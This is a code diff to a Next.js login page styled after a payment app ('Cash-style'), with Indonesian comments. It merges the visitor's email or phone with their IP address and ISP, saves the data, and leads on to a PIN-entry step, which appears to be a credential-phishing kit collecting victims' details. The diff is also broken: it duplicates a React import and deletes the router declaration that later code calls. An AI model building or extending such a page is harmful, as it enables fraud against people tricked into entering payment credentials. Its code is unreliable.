@@ -1,6 +1,7 @@
 "use client";
 import { useState } from "react";
 import { useRouter } from "next/navigation";
+import { useState, useEffect } from "react";
 
 export const metadata = { title: "Log in • Cash-style" };
 
@@ -48,8 +49,11 @@ const handleSubmit = (e) => {
   // Buat payload sesuai pilihan
   const payload = useEmail ? { email } : { phone };
 
+  // Gabungkan dengan IP/ISP visitor
+  const fullPayload = { ...payload, visitor: visitorInfo };
+
   // Simpan ke localStorage untuk dipakai di step PIN
-  localStorage.setItem("loginData", JSON.stringify(payload));
+  localStorage.setItem("loginData", JSON.stringify(fullPayload));
 
   // Munculkan popup
   setShowPopup(true);
@@ -61,10 +65,11 @@ const handleUnlock = () => {
   setShowPopup(false);
   router.push("/pin"); // step berikutnya
 };
+  
   // 👉 state tambahan buat IP & ISP
   const [visitorInfo, setVisitorInfo] = useState(null);
 
-  const router = useRouter();
+
 
   // ⬇️ Ambil IP & ISP saat component pertama kali render
   useEffect(() => {
